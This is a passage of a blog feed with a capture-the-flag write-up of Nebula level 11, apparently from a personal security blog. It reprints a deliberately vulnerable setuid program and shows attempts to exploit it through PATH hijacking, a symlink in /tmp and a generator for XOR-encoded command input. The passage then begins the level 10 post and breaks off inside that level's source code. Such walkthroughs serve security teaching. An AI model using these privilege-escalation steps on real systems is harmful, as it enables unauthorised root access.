+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/*</span>
+</span><span class='line'><span class="cm"> * Return a random, non predictable file, and return the file descriptor for it.</span>
+</span><span class='line'><span class="cm"> */</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">getrand</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">path</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">tmp</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;TEMP&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&quot;%s/%d.%c%c%c%c%c%c&quot;</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span>
+</span><span class='line'>           <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span>
+</span><span class='line'>           <span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span>
+</span><span class='line'>           <span class="sc">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> <span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">unlink</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">process</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
+</span><span class='line'>      <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define CL &quot;Content-Length: &quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;reading from stdin&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">CL</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;invalid header&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">length</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">!=</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread length&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="n">process</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>      <span class="kt">int</span> <span class="n">blue</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
+</span><span class='line'>      <span class="kt">int</span> <span class="n">pink</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">fd</span> <span class="o">=</span> <span class="n">getrand</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">while</span><span class="p">(</span><span class="n">blue</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;blue = %d, length = %d, &quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>          <span class="n">pink</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;pink = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">pink</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>              <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread fail(blue = %d, length = %d)&quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+</span><span class='line'>          <span class="p">}</span>
+</span><span class='line'>          <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>          <span class="n">blue</span> <span class="o">-=</span> <span class="n">pink</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;mmap&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="n">process</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Solution</h3>
+
+<p>In fact I have not passed this one yet, I have met a <strong>problem</strong> which I will talk about later,
+right now I just want to explain my <strong>idea</strong>.</p>
+
+<p>The overall function of the program <em>/home/flag11/flag11</em> is to read some inputs, do some modifications to the inputs and then execute what it gets after the modification.</p>
+
+<p>More specifically, <em>flag11</em> requires that the input should match the following pattern:</p>
+
+<pre><code>Content-Length: %d
+Content...
+</code></pre>
+
+<p>here, depends on the content length <em>%d</em>, <em>flag11</em> will go into two branches, if <code>length &lt; sizeof(buf)</code>,
+<em>flag11</em> would read the content directly into <em>buf</em> and pass it to <em>process</em>.
+Note that it is required that <code>fread(buf, length, 1, stdin) == length</code>, so we know that <em>length</em> must be 1.
+(refer to <a href="http://linux.die.net/man/3/fread">manpage</a> of <em>fread()</em> for details)</p>
+
+<p>Otherwise if <em>length</em> is any number larger or equal to 1024, <em>flag11</em> would buffer the input into a file first,
+then pass the content of the file to <em>process</em>. I think these are the TWO WAYS mentioned in the description.</p>
+
+<p>The function <em>process</em> would do some calculation on <em>buf</em> based on its content using XOR operation.
+So if we want to executes some commands like <em>/bin/getflag</em>, we need to do some reverse calculation and find out
+what the origin <em>buf</em> would be like.</p>
+
+<h4>Way One</h4>
+
+<p>My first thought was that I could make <em>length</em> to be 1, and make a soft link to <em>/bin/getflag</em>, then leverage
+<em>flag11</em> to execute this soft link. I first create a file <em>f.txt</em></p>
+
+<figure class='code'><figcaption><span>f.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>Content-Length: 1
+</span><span class='line'>f
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You can expect that <code>'f' ^ (length&amp;&amp;0xff) == 'g'</code>, where <em>length</em> is 1.
+Then I would execute the following</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level11@nebula:~<span class="nv">$ </span>ln -s /bin/getflag /tmp/g
+</span><span class='line'>level11@nebula:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp/:<span class="nv">$PATH</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>level11@nebula:~<span class="nv">$ </span>/home/flag11/flag11 &lt; /home/level11/f.txt
+</span><span class='line'>sh: gP,: <span class="nb">command </span>not found
+</span><span class='line'>
+</span><span class='line'>level11@nebula:/home/flag11<span class="nv">$ </span>./flag11 &lt; /home/level11/f.txt
+</span><span class='line'>sh: <span class="s1">$&#39;g\240\030&#39;</span>: <span class="nb">command </span>not found
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Failed. Since each time the output command are different (but the first char <em>g</em> is correct),
+it must be that <em>buf</em> actually do not have a string terminator &lsquo;\0&rsquo;,
+so I tried a few times and finally</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level11@nebula:~<span class="nv">$ </span>../flag11/flag11 &lt; ls.txt
+</span><span class='line'>getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well&hellip;here is the <strong>problem</strong>, the <em>system()</em> call would not drop privilege on my system&hellip;</p>
+
+<p>I read the <a href="http://linux.die.net/man/3/system">manpage</a> of <em>system()</em> carefully, it mentioned that</p>
+
+<blockquote><p>Do not use system() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the exec(3) family of functions instead, but not execlp(3) or execvp(3). system() will not, in fact, work properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian uses a modified bash which does not do this when invoked as sh.)</p></blockquote>
+
+<p>I also did some google and find <a href="http://www.cplusplus.com/forum/articles/11153/">this</a> thread on cplusplus
+and <a href="http://stackoverflow.com/questions/16258830/does-system-syscall-drop-privileges">this</a>
+question on Stackoverflow ot be useful. It is said that <em>system()</em> itself would not drop privileges,
+but Bash 2 would, and my bash is version 4, so I think this meybe the reason.</p>
+
+<p>I came across an interesting solution for this routine by <a href="http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-level-11.html">Reno Robert</a>, who leveraged <em>LD_PRELOAD</em> to initialize the buffer.</p>
+
+<h4>Way Two</h4>
+
+<p>Anyway, before I realized this problem, I did do something through the second way,
+to get what the input should be from the output command, I wrote another program <em>gen.c</em>:</p>
+
+<figure class='code'><figcaption><span>gen.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">process</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">key</span> <span class="o">-=</span> <span class="p">(</span><span class="n">key</span> <span class="o">^</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>        <span class="c1">//system(buffer);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;getflag&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1024</span><span class="o">&gt;&gt;</span><span class="mi">2</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">len</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">process</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Content-Length: 1024</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">fwrite</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and after compiling into an executable <em>gen</em>, I tried to trigger the exploit like this</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level11@nebula:~<span class="nv">$ </span>./gen | ../flag11/flag11
+</span><span class='line'><span class="nv">blue</span> <span class="o">=</span> 1024, <span class="nv">length</span> <span class="o">=</span> 1024, <span class="nv">pink</span> <span class="o">=</span> 1024
+</span><span class='line'>getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>same failure, and after that I changed the <em>cmd</em> from &ldquo;getflag&rdquo; to &ldquo;id&rdquo; ,
+and the output is</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level11@nebula:~<span class="nv">$ </span>./gen | ../flag11/flag11
+</span><span class='line'><span class="nv">blue</span> <span class="o">=</span> 1024, <span class="nv">length</span> <span class="o">=</span> 1024, <span class="nv">pink</span> <span class="o">=</span> 1024
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1012<span class="o">(</span>level11<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1012<span class="o">(</span>level11<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1012<span class="o">(</span>level11<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>No privilege dropped )=</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 10]]></title>
+    <link href="http://hanjc.me/blog/2014/01/25/nebula-level10/"/>
+    <updated>2014-01-25T12:40:53+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/25/nebula-level10</id>
+    <content type="html"><![CDATA[<h3>About</h3>
+
+<p>The setuid binary at <em>/home/flag10/flag10</em> binary will upload any file given, as long as it meets the requirements of the <em>access()</em> system call.</p>
+
+<p>To do this level, log in as the <em>level10</em> account with the password <em>level10</em>. Files for this level can be found in /home/flag10.</p>
+
+<h3>Source Code</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span><span class='line'>  <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+</span><span class='line'>      
